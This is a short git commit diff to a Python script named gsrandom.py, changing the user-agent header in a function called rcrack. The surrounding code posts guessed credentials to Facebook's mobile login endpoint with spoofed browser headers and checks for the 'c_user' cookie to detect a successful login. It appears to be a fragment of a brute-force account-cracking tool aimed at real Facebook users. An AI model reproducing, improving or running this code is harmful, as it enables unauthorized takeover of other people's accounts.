de248fc06932c68716b8570ffbed20aa0033c00e
UZZALMAITRA <129254709+UZZALMAITRA@users.noreply.github.com>
2023-06-08 15:10:02 +0530

    Add files via upload

--- gsrandom.py
+++ gsrandom.py
@@ -365,7 +365,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
-            'user-agent': ua}
+            'user-agent': pro}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
